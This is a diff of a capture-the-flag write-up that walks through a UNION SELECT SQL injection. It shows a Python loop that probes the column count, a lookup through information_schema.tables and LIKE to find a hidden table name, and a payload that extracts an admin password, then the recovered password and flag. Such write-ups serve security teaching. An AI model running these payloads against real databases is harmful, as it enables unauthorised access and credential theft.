@@ -57,7 +57,7 @@ Although it does seem as well protected as the previous one, there is one key di
 
 The simple fact is, ```mysqli_real_escape_string``` function escapes special strings, but does not necessarily prevent injection like the one we are going to perform, ```UNION SELECT```. 
 
-Our first goal of this challenge is to find out the table name. Right now, with ```{table_prefix}``` in place, it is impossible to obtain the admin password because we don't know to which table we issue the query! This is where ```information_schema.tables``` comes in.
+Our first goal of this challenge is to find out the table name. Right now, with ```${table_prefix}``` in place, it is impossible to obtain the admin password because we don't know to which table we issue the query! This is where ```information_schema.tables``` comes in.
 
 In MySQL, ```information_schema.tables``` table contains all the metadata related to table objects. In this case, we focus on the field ```table_name```. 
 
@@ -66,7 +66,7 @@ Before that though, in order to succeed in ```UNION SELECT```, we have to do two
 1. match the # of columns of the tables
 2. match the data types of the columns
 
-Assuming that all the entries in the ```{table_prefix}user``` are of type ```VARCHAR```, We can write a little Python code to find the # of columns
+Assuming that all the entries in the ```${table_prefix}user``` are of type ```VARCHAR```, We can write a little Python code to find the # of columns
 ```
 import requests
 
@@ -80,7 +80,6 @@ for count in range(1,20):
     print "# of columns " + str(count)
     resp = requests.get((url + query + last).replace(" ", "%20"))
     query = query + add
-    #if "users" in resp.text:
     print(resp.text + "\n")
 ```
 A rather lousy code, but it does the job. The output is as follows
@@ -182,10 +181,10 @@ Quite visibly, the table whose name we want to know is the only user-created tab
 
 ----2. Being Clever----
 
-Even with ```{$table_prefix}``` we still partially know the name of the table: the name includes ```users```. What we can do then is,
+Even with ```${table_prefix}``` we still partially know the name of the table: the name includes ```users```. What we can do then is,
 use the argument ```LIKE```. 
 
-```LIKE``` is a very handy SQL technique. For MySQL, there are basically two pattern character, ```_``` and ```%```.
+```LIKE``` is a very handy SQL option. For MySQL, there are basically two pattern character, ```_``` and ```%```.
 
 - ```_``` matches to exactly 1 character. For example, the pattern ```ap___``` can match to a 5-letter word starting with ```ap```, such as ```apple``` or ```apart```. 
 - On the other hand, ```%``` can match to any pattern, including nothing. For example, the pattern ```ap%``` can match any word starting with ```ap```, such as ```apple```, ```application``` and ```apartment```.
@@ -213,7 +212,7 @@ print(resp.text)
 ```
 Either way, it finds the name succesfully. 
 
-Finally, now we can find the admin password! Simple enough, we can again do ```UNION QUERY``` but this time from ```super_secret_users```. 
+Finally, now we can find the admin password! Simple enough, we can again do ```UNION SELECT``` but this time from the table ```super_secret_users```. 
 
 ```
 query = "id=0 AND 1=0 UNION SELECT password,password,password,password,password,password,password FROM super_secret_users LIMIT 1"
@@ -222,6 +221,5 @@ This gives
 ```
 not_the_flag_super_secret_admin_password
 ```
-So login as admin with this password, and there it is the flag
-```flag_2tc7ZPa5PEhcyZJXgH```
+So login as admin with this password, and there it is the flag ```flag_2tc7ZPa5PEhcyZJXgH```
 
